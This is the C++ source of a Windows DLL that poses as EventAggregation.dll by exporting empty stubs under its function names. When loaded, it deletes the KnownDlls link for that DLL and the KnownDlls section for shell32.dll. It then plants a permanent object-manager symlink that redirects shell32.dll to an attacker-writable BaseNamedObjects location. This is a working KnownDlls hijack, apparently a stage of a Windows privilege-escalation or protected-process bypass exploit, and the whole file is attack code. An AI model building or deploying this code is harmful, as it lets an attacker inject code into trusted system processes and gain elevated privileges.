#include "ntdll.h"
#include <winternl.h>
#include <sddl.h>

extern "C" __declspec(dllexport) void APIENTRY BriCreateBrokeredEvent();
extern "C" __declspec(dllexport) void APIENTRY BriDeleteBrokeredEvent();
extern "C" __declspec(dllexport) void APIENTRY EaCreateAggregatedEvent();
extern "C" __declspec(dllexport) void APIENTRY EACreateAggregateEvent();
extern "C" __declspec(dllexport) void APIENTRY EaQueryAggregatedEventParameters();
extern "C" __declspec(dllexport) void APIENTRY EAQueryAggregateEventData();
extern "C" __declspec(dllexport) void APIENTRY EaFreeAggregatedEventParameters();
extern "C" __declspec(dllexport) void APIENTRY EaDeleteAggregatedEvent();
extern "C" __declspec(dllexport) void APIENTRY EADeleteAggregateEvent();

BOOL DeleteSection(LPCWSTR path)
{
    HANDLE hLink;
    UNICODE_STRING name;

    RtlInitUnicodeString(&name, path);
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, OBJ_CASE_INSENSITIVE, NULL, NULL };

    if (NtOpenSection(&hLink, DELETE, &oa))
        return FALSE;

    BOOL returnValue = NtMakeTemporaryObject(hLink) == 0;

    NtClose(hLink);

    return returnValue;
}

BOOL DeleteObjectLink(LPCWSTR path)
{
    HANDLE hLink;
    UNICODE_STRING name;
    SECURITY_DESCRIPTOR sd;

    RtlInitUnicodeString(&name, path);
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, OBJ_CASE_INSENSITIVE, NULL, NULL };

    if (NtOpenSymbolicLinkObject(&hLink, WRITE_DAC, &oa))
        return FALSE;

    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
#pragma warning( suppress : 6248 ) // Disable warning as setting a NULL DACL is intentional here
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    if (!SetKernelObjectSecurity(hLink, DACL_SECURITY_INFORMATION, &sd) | NtClose(hLink))
        return FALSE;

    if (NtOpenSymbolicLinkObject(&hLink, DELETE, &oa))
        return FALSE;

    BOOL returnValue = NtMakeTemporaryObject(hLink) == 0;

    NtClose(hLink);

    return returnValue;
}

HANDLE ObjectManagerCreateSymlink(LPCWSTR linkname, LPCWSTR targetname)
{
    UNICODE_STRING name, target;
    HANDLE hLink;
    PSECURITY_DESCRIPTOR sd;

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:(A;;GA;;;BA)(A;;GR;;;RC)(A;;GR;;;WD)(A;;GR;;;AC)(A;;GR;;;S-1-15-2-2)S:(ML;;NW;;;LW)",
        SDDL_REVISION_1, &sd, 0)) return NULL;

    RtlInitUnicodeString(&name, linkname);
    RtlInitUnicodeString(&target, targetname);
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL };

    if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &target))
        return NULL;

    SetKernelObjectSecurity(hLink, DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION, sd);

    return hLink;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
        DeleteObjectLink(L"\\KnownDlls\\EventAggregation.dll");
        if (DeleteSection(L"\\KnownDlls\\shell32.dll"))
            ObjectManagerCreateSymlink(L"\\KnownDlls\\shell32.dll", L"\\BaseNamedObjects\\shell32.dll");
	}
	return TRUE;
}

void APIENTRY BriCreateBrokeredEvent() { }
void APIENTRY BriDeleteBrokeredEvent() { }
void APIENTRY EaCreateAggregatedEvent() { }
void APIENTRY EACreateAggregateEvent() { }
void APIENTRY EaQueryAggregatedEventParameters() { }
void APIENTRY EAQueryAggregateEventData() { }
void APIENTRY EaFreeAggregatedEventParameters() { }
void APIENTRY EaDeleteAggregatedEvent() { }
void APIENTRY EADeleteAggregateEvent() { }